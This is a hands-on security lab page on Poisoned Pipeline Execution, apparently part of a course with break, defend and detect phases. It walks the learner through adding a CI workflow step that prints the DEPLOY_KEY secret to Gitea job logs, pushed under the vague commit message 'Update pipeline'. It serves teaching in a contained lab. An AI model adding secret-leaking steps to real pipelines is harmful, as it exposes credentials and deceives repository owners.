# Lab 0.4: How CI/CD Works

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Poisoning the Pipeline

Because the CI configuration lives *in the repository*, anyone with push access can change what the pipeline does. This is **Poisoned Pipeline Execution (PPE)**.

1. Open the repo in the workstation and edit the workflow:

   ```bash
   cd /workspace/ci-demo
   ```

   Edit `.gitea/workflows/ci.yml`. Add a step to exfiltrate the secret to the workflow logs. In a real attack, this would usually be a `curl` or DNS request to an attacker-controlled host.

   ```yaml
      - name: Exfiltrate secrets
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
        run: |
          echo "EXFILTRATED DEPLOY_KEY=$DEPLOY_KEY"
   ```
   Place this step inside the `deploy` job, right before `Deploy to staging`. Keep the indentation aligned with the existing deploy step.

2. Commit and push:
   ```bash
   git add .gitea/workflows/ci.yml
   git commit -m "Update pipeline"
   git push
   ```

3. Watch the Action run in Gitea. Open the run logs for the `deploy` job and confirm the secret appears in the output.

**Checkpoint:** You should now have a modified CI workflow that prints `DEPLOY_KEY` in the `deploy` job logs on every push to `main`.
